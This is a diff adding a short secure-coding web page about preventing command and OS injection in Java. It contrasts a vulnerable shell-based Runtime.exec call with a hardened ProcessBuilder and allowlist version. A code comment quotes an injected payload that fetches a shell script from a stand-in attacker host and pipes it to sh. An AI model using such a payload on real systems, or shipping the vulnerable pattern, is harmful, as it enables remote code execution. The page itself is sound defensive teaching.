@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Command & OS Injection Prevention</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css" />
+</head>
+<body>
+<div class="wrap">
+  <a class="back" href="../security.html">&larr; back</a>
+  <h1>Command & OS Injection Prevention</h1>
+  <p class="desc">Passing user input to a shell interpreter (<code>sh -c</code> or <code>cmd.exe /c</code>) enables command chaining via <code>;</code>, <code>&amp;&amp;</code>, or backticks. Prefer native Java libraries; if an external binary is unavoidable, invoke <code>ProcessBuilder</code> with an explicit argument list and validate against a strict allowlist.</p>
+  <pre><code class="language-java">// VULNERABLE: Invoking a shell allows '; curl attacker.com/shell.sh | sh'
+Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "ping -c 1 " + userHost});
+
+// HARDENED: Validate against a strict pattern and pass arguments as separate tokens (no shell)
+private static final Pattern HOST_ALLOWLIST = Pattern.compile("^[a-zA-Z0-9.-]{1,64}$");
+
+public int pingHostSafely(String host) throws IOException, InterruptedException {
+    if (!HOST_ALLOWLIST.matcher(host).matches()) {
+        throw new IllegalArgumentException("Invalid hostname");
+    }
+    ProcessBuilder pb = new ProcessBuilder("/usr/bin/ping", "-c", "1", "--", host);
+    pb.redirectErrorStream(true);
+    Process process = pb.start();
+    return process.waitFor();
+}</code></pre>
+</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
